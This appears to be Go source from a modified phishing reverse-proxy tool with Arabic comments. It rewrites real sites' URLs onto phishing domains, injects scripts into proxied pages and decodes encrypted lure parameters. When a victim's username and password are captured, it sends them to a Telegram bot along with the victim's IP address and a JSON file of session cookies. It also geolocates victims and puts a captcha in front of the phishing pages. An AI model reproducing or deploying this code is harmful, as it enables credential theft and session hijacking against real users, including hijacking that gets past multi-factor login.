		resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
		return req, resp
	}
	
	// استخراج النطاق الرئيسي للكوكيز
	host := req.Host
	mainDomain := ""
	parts := strings.Split(host, ".")
	if len(parts) >= 2 {
		mainDomain = strings.Join(parts[len(parts)-2:], ".")
	}
	
	// عرض صفحة الكابتشا مع حفظ البريد الإلكتروني إذا كان موجودًا
	captchaHTML := `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        .captcha-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
    </style>
    <script>
        // تخزين البريد الإلكتروني في localStorage إذا كان موجودًا
        window.onload = function() {
            var email = "` + email + `";
            var mainDomain = "` + mainDomain + `";
            
            if (email && email.length > 0) {
                // تخزين في localStorage (يعمل فقط للنطاق الحالي)
                localStorage.setItem('user_email', email);
                console.log("تم تخزين البريد الإلكتروني في localStorage: " + email);
                
                // إضافة كوكي للبريد الإلكتروني - مع ضبطه للنطاق الرئيسي
                if (mainDomain) {
                    document.cookie = "user_email=" + email + "; path=/; domain=." + mainDomain + "; max-age=86400; secure";
                    console.log("تم تخزين البريد الإلكتروني في كوكي مشترك للنطاق: ." + mainDomain);
                } else {
                    document.cookie = "user_email=" + email + "; path=/; max-age=86400";
                }
            }
        };
        
        function onCaptchaSuccess(token) {
            document.getElementById('captcha-form').submit();
        }
    </script>
</head>
<body>
    <div class="container">
        <form id="captcha-form" action="/verify_captcha" method="POST">
            <input type="hidden" name="redirect_path" value="` + req.URL.String() + `">
            <div class="captcha-container">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
            </div>
        </form>
    </div>
</body>
</html>`
	
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
	return req, resp
}

func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
	if mime == "" {
		mime = "text/plain"
	}
	resp := goproxy.NewResponse(req, mime, http_status, body)
	if resp != nil {
		origin := req.Header.Get("Origin")
		if origin != "" {
			resp.Header.Set("Access-Control-Allow-Origin", origin)
		}
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		return req, resp
	}
	return req, nil
}

func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
	js_nonce := ""
	if m_nonce != nil {
		js_nonce = " nonce=\"" + m_nonce[1] + "\""
	}
	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	var d_inject string
	if script != "" {
		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
	} else if src_url != "" {
		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
	} else {
		return body
	}
	ret := []byte(re.ReplaceAllString(string(body), d_inject))
	return ret
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	rand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}
	var js_url string
	n := 0
	for n < len(lure_url) {
		t := make([]byte, 1)
		rand.Read(t)
		rn := int(t[0])%3 + 1

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"

		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		tls_cfg := &tls.Config{}
		if !p.developer {

			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)

			return tls_cfg, nil
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)
		
		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
		if s.Username != "" && s.Password != "" {
			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
		}
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)
		
		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
		if s.Username != "" && s.Password != "" {
			// سجل للتحقق من تنفيذ الدالة
			log.Info("جاري إرسال بيانات الاعتماد للجلسة: %s", sid)
			
			// إرسال إشعار ببيانات الاعتماد المسجلة
			err := p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
			if err != nil {
				log.Error("خطأ في إرسال الإشعار: %v", err)
			}
			
			// استدعاء الدالة الجديدة لإرسال الكوكيز
			go func() {
				cookiesList := []map[string]interface{}{} // قائمة لتخزين الكوكيز بالتنسيق المطلوب

				// تأخير قصير للتأكد من جمع جميع البيانات
				time.Sleep(1 * time.Second)
				
				// إضافة بيانات الكوكيز
				if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
					for domain, cookies := range s.CookieTokens {
						for name, cookie := range cookies {
							cookieData := map[string]interface{}{
								"path":           cookie.Path,
								"domain":         domain,
								"expirationDate": cookie.ExpirationDate, // تأكد من أن هذا الحقل موجود في الهيكل
								"value":          cookie.Value,
								"name":           name,
								"httpOnly":      cookie.HttpOnly,
								"hostOnly":      false, // يمكنك تعديل هذا بناءً على الحاجة
								"secure":        false, // يمكنك تعديل هذا بناءً على الحاجة
								"session":       false, // يمكنك تعديل هذا بناءً على الحاجة
							}
							cookiesList = append(cookiesList, cookieData)
						}
					}
				} else {
					log.Warning("لا توجد كوكيز مخزنة للجلسة: %s", s.Id)
				}
				
				// تحويل قائمة الكوكيز إلى JSON
				cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
				if err != nil {
					log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
					return
				}
	
				// إرسال النص كملف إلى تيليجرام
				fileName := fmt.Sprintf("cookies_%s_%s.txt", s.Name, s.Id)
				err = p.telegram.SendFileFromText(fileName, string(cookiesJSON))
				if err != nil {
					log.Error("فشل في إرسال ملف الكوكيز: %v", err)
				} else {
					log.Success("تم إرسال ملف الكوكيز بنجاح للجلسة: %s", s.Id)
				}
			}()
		}
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}

func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
	s_hash := fmt.Sprintf("%x", hash[:4])
	s_hash = s_hash[:4] + "-" + s_hash[4:]
	return s_hash
}

func (p *HttpProxy) notifyTokensCaptured(sid string) {
	// التحقق من وجود الجلسة
	s, ok := p.sessions[sid]
	if !ok {
		return
	}

	// التحقق من أن تليجرام مفعل
	if p.telegram != nil && p.telegram.Enabled {
		// إرسال إشعار بالتقاط الرموز
		go p.telegram.NotifyTokensCaptured(sid, s.Name, s.RemoteAddr)
	}
}

// دالة للحصول على معلومات البلد من عنوان IP
func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
	log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", ipAddress)
	
	// استخدام freegeoip.app للحصول على معلومات البلد
	url := "https://freegeoip.app/json/" + ipAddress
	
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	
	resp, err := client.Get(url)
	if err != nil {
		log.Error("خطأ في الاتصال بخدمة تحديد الموقع الجغرافي: %v", err)
		// استخدام خدمة احتياطية
		return tryBackupGeoService(ipAddress)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		log.Error("خدمة تحديد الموقع الجغرافي أعادت حالة خطأ: %d", resp.StatusCode)
		// استخدام خدمة احتياطية
		return tryBackupGeoService(ipAddress)
	}
	
	var result map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		log.Error("خطأ في فك ترميز استجابة خدمة تحديد الموقع الجغرافي: %v", err)
		// استخدام خدمة احتياطية
		return tryBackupGeoService(ipAddress)
	}
	
	// استخراج رمز البلد واسم البلد
	countryCode, _ = result["country_code"].(string)
	country, _ = result["country_name"].(string)
	
	log.Debug("تم الحصول على معلومات البلد من عنوان IP: %s", ipAddress)
	log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
	
	return countryCode, country
}

// دالة احتياطية للحصول على معلومات البلد من خدمة بديلة
func tryBackupGeoService(ipAddress string) (countryCode string, country string) {
	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
	
	// استخدام خدمة ipapi.co للحصول على معلومات البلد
	url := "https://ipapi.co/" + ipAddress + "/json/"
	
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	
	resp, err := client.Get(url)
	if err != nil {
		log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
		return "", ""
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
		return "", ""
	}
	
	var result map[string]interface{}
	err = json.NewDecoder(resp.Body).Decode(&result)
	if err != nil {
		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
		return "", ""
	}
	
	cc, ok := result["country_code"].(string)
	if ok && cc != "" {
		countryCode = cc
	}
	
	c, ok := result["country_name"].(string)
	if ok && c != "" {
		country = c
	}
	
	log.Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
	
	return countryCode, country
}
